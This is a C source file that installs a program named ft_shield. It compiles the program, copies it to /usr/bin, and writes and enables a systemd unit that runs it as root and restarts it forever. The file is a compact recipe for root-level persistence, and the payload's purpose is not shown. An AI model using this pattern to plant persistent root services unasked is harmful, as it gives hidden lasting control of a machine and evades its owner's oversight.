#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syslog.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/file.h>
#include <fcntl.h>
#include <syslog.h>

# define BUFFER_SIZE 1024
#define FT_SHIELD_SERVICE_PATH "/etc/systemd/system/ft_shield.service"

int main() {
    const char *p = "[Unit]\nDescription=ft_shield service\nAfter=network.target\n[Service]\ntype=forking\nPIDFile=/var/lock/ft_shield.lock\nExecStart=/usr/bin/ft_shield\nRestart=always\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
    umask(0);
    if (getuid()) {
        printf("ft_shield needs root privileges\n");
        return (EXIT_FAILURE);
    }
    pid_t pid = fork();
    if (pid == 0) {
        char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
        if (buffer == NULL) {
            return 1;
        }
        size_t buffer_size = BUFFER_SIZE;
        getlogin_r(buffer, buffer_size);
        printf("Login: %s\n", buffer);
        exit(EXIT_SUCCESS);
    } else {
        int ret = system("gcc src/ft_shield.c -o ft_shield;mv ft_shield /usr/bin/");
        if (ret != 0) {
            printf("error\n");
            return 1;
        }
        int fd = open(FT_SHIELD_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
        if (fd < 0) {
            return -1;
        }
        write(fd, p, strlen(p));
        system("systemctl daemon-reload");
        system("systemctl enable ft_shield");
        system("systemctl start ft_shield");
    }
    return (0);
}
